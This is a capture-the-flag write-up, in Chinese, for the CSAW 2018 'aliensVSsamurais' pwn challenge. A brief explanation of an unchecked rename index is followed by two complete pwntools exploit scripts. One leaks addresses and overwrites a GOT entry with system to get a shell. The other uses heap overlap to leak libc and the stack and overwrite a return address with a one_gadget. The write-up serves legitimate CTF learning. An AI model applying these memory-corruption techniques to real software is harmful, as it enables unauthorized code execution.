

> Construct additional pylons

改名的时候未检查输出索引值的大小，因此可正可负，可以随意越界，从而构造内存泄露地址，最终改GOT表值，将`strtol`的值改为`system`，获取shell。

不过感觉这题非预期了

## 个人解法

```py
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools

IP = "pwn.chal.csaw.io"
PORT = 9004
# IP = "127.0.0.1"
# PORT = 8000

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./aliensVSsamurais"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()

# context.binary = args.binary # this just hangs???


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    context.noptrace = True
    io = remote(IP, PORT)  
    libc = ELF("./libc-2.23.so")
elif args.local or args.debugger:
    io = process(BIN)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/CSAW18/pwn/alien_invasion/aliensVSsamurais"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
    parser.print_help()
    exit()

if args.debugger:
    gdb.attach(io, '''
    aslr off
    b *0x{:x}
    b *0x{:x}
    c
    '''.format(
        proc_base+0x0000000000000D39,  # call gets
        proc_base+0x0000000000000DAD,  # call read
        # libc_bb + one_gg
        )
    )


## create two samurai
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("A"*7)
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("B"*7)
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("C"*7)

# break
rud("Daimyo, nani o shitaidesu ka?")
sel("3")

rud("Brood mother, what tasks do we have today.")
sel("1")
rud("How long is my name?")
sel(str(0x60))
rud("What is my name?")
sel("B"*0x5f)


rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(-10))
rud("Oh great what would you like to rename ")

data = rud("\n").strip()[:-4].ljust(8, "\x00")
data = u64(data)
bin_base = data - 0x0202070
binary.address = bin_base

print "leaked bin base: ", hex(bin_base)

io.send("\x70")


rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(400))
rud("Oh great what would you like to rename ")
sel(p64(binary.address + 0x0000000000202700 + 8))

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(401))
rud("Oh great what would you like to rename ")
sel(p64(binary.got["__libc_start_main"]))


rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(200))
rud("Oh great what would you like to rename ")
data = rud("\n").strip()[:-4].ljust(8, "\x00")
# print data, data.encode("hex")
data = u64(data)
libc_base = data - libc.symbols["__libc_start_main"]
libc.address = libc_base

print "leaked libc base: ", hex(libc.address)

io.send("\x40")

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(401))
rud("Oh great what would you like to rename ")
sel(p64(binary.got["strtoul"]))

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(200))
rud("Oh great what would you like to rename ")
io.send(p64(libc.symbols["system"]))

rud("Brood mother, what tasks do we have today.")
sel("/bin/sh\x00")


io.interactive()


```

## 官方解法

```py
import argparse
import random
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-p', '--port')
parser.add_argument('-r', '--remote')
parser.add_argument('-e', '--elf')
parser.add_argument('-b', '--binary')
args = parser.parse_args()

context.terminal = '/bin/bash'
context.log_level = 'debug' # this is a brute wew
# context.binary = args.binary # this just hangs???


p = None # this is global process variable
e = None
b = None

if args.elf:
  e = ELF(args.elf)

if args.remote:
  p = remote(args.remote, args.port) # TODO: add a remote service URI here
elif args.binary:
  p = process(args.binary)
else:
  parser.print_help()
  exit()
if args.debugger:
  if args.remote:
    print("You can't attach a debugger to a remote process")
  else:
    gdb.attach(p) # if in vagrant just run gdb and attach it.


# TODO: Setup enough samurais to beat the final alien

def create_sam():
  p.recvuntil('ka?\n')
  p.sendline(str(1))
  p.recvuntil('name?\n')
  p.sendline('A' * 0x8)

def kill_sam(index):
  p.recvuntil('ka?\n')
  p.sendline(str(2))
  p.recvuntil('daimyo?\n')
  p.sendline(str(index))

SAMURAIS = 40
for i in range(SAMURAIS):
  create_sam()

# we make room for aliens in the heap to exist.
unkillable = [3, 4, 6, 7, 9, 13, 14, 16]
for i in range(9 + len(unkillable)):
  if i in unkillable: continue
  kill_sam(i)

p.recvuntil('ka?\n')
p.sendline(str(3))

# TODO: Alien => alien => libc leak
def create_alien(size, data):
  p.recvuntil('today.\n')
  p.sendline(str(1))
  p.recvuntil('name?\n')
  p.sendline(str(size))
  p.recvuntil('name?\n')
  p.send(data)

def kill_alien(index):
  p.recvuntil('today.\n')
  p.sendline(str(2))
  p.recvuntil('mother?\n')
  p.sendline(str(index))

def rename_alien(index, data):
  p.recvuntil('today.\n')
  p.sendline(str(3))
  p.recvuntil('rename?\n')
  p.sendline(str(index))
  p.recvuntil('to?')
  p.send(data)

create_alien(0xf8, 'A' * 0xf7) # 0 killed
create_alien(0x200, 'B' * 0x1f0 + p64(0x210)[:-1]) # 1 killed
create_alien(0xf8, 'C' * 0xf7) # 2 killed
create_alien(0xf8, 'D' * 0xf7) #3


kill_alien(0) # kill and overwrite to overflow
kill_alien(1)
create_alien(0xf8, 'E' * 0xf8) # 4 => overflows and misaligns C's prev_size field.

create_alien(0xf8, 'F' * 0xf7) # 5 killed
create_alien(0x80, 'G' * 0x7f) # 6

kill_alien(5)
kill_alien(2)

create_alien(0xf8, 'H' * 0xf7) # 7
create_alien(0x80, 'I' * 0x79) # 8 killed
kill_alien(8)

p.recvuntil('today.\n')
p.sendline(str(3))
p.recvuntil('rename?\n')
p.sendline(str(6)) # rename the libc leak
p.recvuntil('rename ')
leak = p.recvuntil('to?\n')
leak = leak.strip(' to?\n')
leak = u64(leak + '\x00' * (8 - len(leak)))
print('LEAK: ' + hex(leak))
print(hex(e.symbols['puts']))
main_arena_plus_88 = 0x3c4b78
libc_base = leak - main_arena_plus_88
free_hook = libc_base + e.symbols['__free_hook']
environ = libc_base + e.symbols['environ']
one_gadget = libc_base + 0x45216

p.send(p64(leak)[:-1])


create_alien(0x200, 'J' * 0xf7) # 9 to reset the heap
create_alien(0xf8, 'a' * 0xf7) # 10 killed
create_alien(0x200, 'b' * 0x1f0 + p64(0x210)[:-1]) # 11 killed
create_alien(0xf8, 'c' * 0xf7) # 12 killed
create_alien(0xf8, 'd' * 0xf7) #13


kill_alien(10) # kill and overwrite to overflow
kill_alien(11)
create_alien(0xf8, 'e' * 0xf8) # 14 => overflows and misaligns C's prev_size field.

create_alien(0xf8, 'f' * 0xf7) # 15 killed
create_alien(0x200, 'g' * 0x1ff) # 16 this will be stuck into the "modified" position DO NOT KILL

kill_alien(15)
kill_alien(12)

payload = 'h' * 0xf8
payload += p64(0x21)
payload += p64(environ)
payload += p64(0x9)[:-1]

create_alien(len(payload) + 1, payload) # 17

p.recvuntil('today.\n')
p.sendline(str(3))
p.recvuntil('rename?\n')
p.sendline(str(16))
p.recvuntil('rename\x20')
leak = p.recvuntil(' to?\n')
leak = leak.strip(' to?\n')
stack_leak = u64(leak + '\x00' * (8 - len(leak)))

p.send(p64(stack_leak)[:-1])
print('Environ: ' + hex(stack_leak))

kill_alien(17)

ret_offset = -336
print("Return address overwrite:" + hex(stack_leak + ret_offset))

payload = 'h' * 0xf8
payload += p64(0x21)
payload += p64(stack_leak + ret_offset)
payload += p64(0x9)[:-1]
create_alien(len(payload) + 1, payload) # 18 in 17's place

rename_alien(16, p64(one_gadget)[:-1])

# print("Puts (for reference): " + hex(libc_base + e.symbols['puts']))
# print('Free hook: ' + hex(free_hook))
# print('One Gadget: ' + hex(one_gadget))
# pause()

p.interactive()

```